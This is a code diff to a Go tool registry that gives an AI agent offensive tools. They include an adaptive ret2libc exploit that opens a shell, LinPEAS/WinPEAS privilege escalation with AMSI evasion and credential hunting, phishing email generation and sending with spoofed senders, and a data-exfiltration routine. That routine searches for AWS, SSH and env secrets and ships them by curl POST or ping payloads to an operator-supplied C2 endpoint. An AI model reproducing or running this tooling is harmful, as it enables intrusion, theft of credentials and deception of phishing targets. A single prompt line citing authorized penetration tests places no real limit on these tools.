@@ -642,7 +642,7 @@ func (r *ToolRegistry) Definitions() []openai.ChatCompletionToolParam {
 		}, "required": []string{"binary_path"}},
 	}})
 	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
-		Name: "binary_ret2libc", Description: openai.String("Generate and run a generic ret2libc pwntools exploit script against a binary."),
+		Name: "binary_ret2libc", Description: openai.String("Run an adaptive ret2libc chain: auto-discovers the architecture and a GOT leak primitive, leaks a libc address, resolves the libc base, and executes a full system(\"/bin/sh\") ROP payload."),
 		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
 			"binary_path": map[string]interface{}{"type": "string", "description": "Path to binary"},
 			"libc_path":   map[string]interface{}{"type": "string", "description": "Path to libc"},
@@ -703,7 +703,7 @@ func (r *ToolRegistry) Definitions() []openai.ChatCompletionToolParam {
 		}, "required": []string{"lhost", "lport", "format"}},
 	}})
 	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
-		Name: "auto_privesc", Description: openai.String("Automatically upload and run privilege escalation scripts (LinPEAS/WinPEAS) purely in memory."),
+		Name: "auto_privesc", Description: openai.String("Automatically execute privilege escalation enumeration on a compromised shell: LinPEAS in-memory (Linux) or WinPEAS disk-resident/AMSI-safe plus a saved-credential hunt (Windows)."),
 		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
 			"session_id": map[string]interface{}{"type": "string", "description": "Active shell session ID"},
 			"os_type":    map[string]interface{}{"type": "string", "description": "linux or windows"},
@@ -749,10 +749,12 @@ func (r *ToolRegistry) Definitions() []openai.ChatCompletionToolParam {
 		}, "required": []string{"target_profile"}},
 	}})
 	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
-		Name: "send_phish", Description: openai.String("Send the generated phishing email to the target."),
+		Name: "send_phish", Description: openai.String("Send the generated phishing email to the target through the SMTP relay."),
 		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
 			"target_email": map[string]interface{}{"type": "string", "description": "Target email address"},
 			"template":     map[string]interface{}{"type": "string", "description": "Email content"},
+			"smtp_server":  map[string]interface{}{"type": "string", "description": "Optional SMTP relay endpoint (default 127.0.0.1:25)"},
+			"sender_email": map[string]interface{}{"type": "string", "description": "Optional spoofed sender address"},
 		}, "required": []string{"target_email", "template"}},
 	}})
 
@@ -1847,9 +1849,10 @@ OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, url, action)
 	}
 
 	r.builtins["smart_data_exfiltration"] = func(ctx context.Context, args map[string]any) string {
-		searchTarget, _ := args["searchTarget"].(string) // e.g. "aws", "ssh", "env"
-		channel, _ := args["channel"].(string)           // e.g. "http", "dns", "ping"
+		searchTarget, _ := args["searchTarget"].(string)  // e.g. "aws", "ssh", "env"
+		channel, _ := args["channel"].(string)            // e.g. "http", "dns", "ping"
 		startListener, _ := args["startListener"].(bool)
+		c2Endpoint, _ := args["c2_endpoint"].(string)     // e.g. "http://ATTACKER:8080" or "ATTACKER_IP" for ping
 
 		if searchTarget == "" || channel == "" {
 			return "[Error] searchTarget and channel are required"
@@ -1879,17 +1882,62 @@ OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, url, action)
 			return fmt.Sprintf("[-] No files found matching target: %s", searchTarget)
 		}
 
-		// Optionally start a listener
+		// Resolve the collection endpoint. An operator-controlled c2Endpoint is
+		// preferred; without one the http channel falls back to a sandbox-local
+		// collector that saves POST bodies under /tmp/http_exfil_received so
+		// data is actually captured instead of posted into the void.
+		endpointHost := r.sandbox.GetContainerIP(ctx)
+		localCollector := false
+		if c2Endpoint != "" {
+			endpointHost = c2Endpoint
+		} else if strings.EqualFold(channel, "http") {
+			collector := `cat > /tmp/http_collect.py << 'PEOF'
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import os, time
+class H(BaseHTTPRequestHandler):
+    def do_POST(self):
+        n = int(self.headers.get('Content-Length', 0))
+        data = self.rfile.read(n)
+        d = '/tmp/http_exfil_received'
+        os.makedirs(d, exist_ok=True)
+        open(os.path.join(d, 'chunk_%d.bin' % time.time_ns()), 'wb').write(data)
+        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+    def log_message(self, *a): pass
+HTTPServer(('0.0.0.0', 8080), H).serve_forever()
+PEOF
+nohup python3 /tmp/http_collect.py > /tmp/http_collect.log 2>&1 &
+sleep 1`
+			if _, err := r.sandbox.Execute(ctx, collector); err != nil {
+				return fmt.Sprintf("[Exfiltration Error] failed to start HTTP collector: %v", err)
+			}
+			localCollector = true
+		}
+
 		listenerInfo := ""
 		if startListener {
-			if channel == "http" {
-				sessionID, _ := r.shells.Listen(8080)
-				listenerInfo = fmt.Sprintf("[+] Started HTTP Listener on port 8080. Session: %s", sessionID)
+			if strings.EqualFold(channel, "http") {
+				if localCollector {
+					listenerInfo = fmt.Sprintf("[+] Started in-sandbox HTTP collector on :8080 -> /tmp/http_exfil_received (container-local).")
+				} else {
+					listenerInfo = fmt.Sprintf("[+] Using operator-controlled C2 endpoint: %s", c2Endpoint)
+				}
+			} else {
+				listenerInfo = fmt.Sprintf("[!] startListener only applies to the http channel; continuing with %s", channel)
 			}
 		}
 
 		var exfilResults strings.Builder
 		exfilResults.WriteString(fmt.Sprintf("[*] Found %d files. Attempting exfiltration via %s...\n%s\n", len(files), channel, listenerInfo))
+		if !strings.EqualFold(channel, "http") {
+			exfilResults.WriteString(fmt.Sprintf("[*] Endpoint: %s\n", endpointHost))
+		}
+
+		httpBase := endpointHost
+		if strings.HasPrefix(c2Endpoint, "http://") || strings.HasPrefix(c2Endpoint, "https://") {
+			httpBase = strings.TrimRight(c2Endpoint, "/")
+		} else if c2Endpoint != "" && !strings.Contains(c2Endpoint, "://") {
+			httpBase = fmt.Sprintf("http://%s", strings.TrimRight(c2Endpoint, "/"))
+		}
 
 		for _, file := range files {
 			if file == "" {
@@ -1898,9 +1946,13 @@ OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, url, action)
 			var cmd string
 			switch strings.ToLower(channel) {
 			case "http":
-				cmd = fmt.Sprintf(`curl -s -X POST -d @"%s" http://%s:8080/exfil || echo "Failed"`, file, r.sandbox.GetContainerIP(ctx)) // Replace with actual C2 IP in a real scenario
+				cmd = fmt.Sprintf(`curl -s -X POST --data-binary @"%s" %s/exfil && echo "OK" || echo "Failed"`, file, httpBase)
 			case "ping":
-				cmd = fmt.Sprintf(`cat "%s" | xxd -p -c 16 | while read line; do ping -c 1 -p $line %s >/dev/null 2>&1; done; echo "Ping exfil done"`, file, r.sandbox.GetContainerIP(ctx))
+				host := endpointHost
+				if i := strings.IndexAny(host, ":/"); i != -1 {
+					host = host[:i]
+				}
+				cmd = fmt.Sprintf(`cat "%s" | xxd -p -c 16 | while read line; do ping -c 1 -W 1 -p $line %s >/dev/null 2>&1; done; echo "Ping exfil done"`, file, host)
 			default:
 				cmd = fmt.Sprintf(`echo "Unsupported channel: %s"`, channel)
 			}
@@ -1909,6 +1961,9 @@ OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, url, action)
 			exfilResults.WriteString(fmt.Sprintf("[+] %s: %s\n", file, strings.TrimSpace(out)))
 		}
 
+		if localCollector {
+			exfilResults.WriteString("[*] Recovered data is staged inside the sandbox under /tmp/http_exfil_received (docker cp .:/tmp/http_exfil_received out/).\n")
+		}
 		return exfilResults.String()
 	}
 
@@ -2609,7 +2664,17 @@ OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, command)
 	}
 	r.builtins["generate_phish_email"] = func(ctx context.Context, args map[string]any) string {
 		targetProfile, _ := args["target_profile"].(string)
-		out, err := social.GeneratePhishEmail(ctx, targetProfile, r.sandbox)
+		var generate func(c context.Context, prompt string) (string, error)
+		if r.provider != nil {
+			generate = func(c context.Context, prompt string) (string, error) {
+				msgs := []openai.ChatCompletionMessageParamUnion{
+					openai.SystemMessage("You draft phishing emails for authorized penetration tests only. Output exactly as instructed."),
+					openai.UserMessage(prompt),
+				}
+				return r.provider.CompleteText(c, msgs)
+			}
+		}
+		out, err := social.GeneratePhishEmail(ctx, targetProfile, r.sandbox, generate)
 		if err != nil {
 			return fmt.Sprintf("[Phish Error] %v", err)
 		}
@@ -2618,7 +2683,9 @@ OUTPUT ONLY THE SOURCE CODE. NO EXPLANATIONS. NO MARKDOWN.`, command)
 	r.builtins["send_phish"] = func(ctx context.Context, args map[string]any) string {
 		targetEmail, _ := args["target_email"].(string)
 		template, _ := args["template"].(string)
-		out, err := social.SendPhish(ctx, targetEmail, template, r.sandbox)
+		smtpServer, _ := args["smtp_server"].(string)
+		senderEmail, _ := args["sender_email"].(string)
+		out, err := social.SendPhish(ctx, targetEmail, template, smtpServer, senderEmail, r.sandbox)
 		if err != nil {
 			return fmt.Sprintf("[Phish Error] %v", err)
 		}
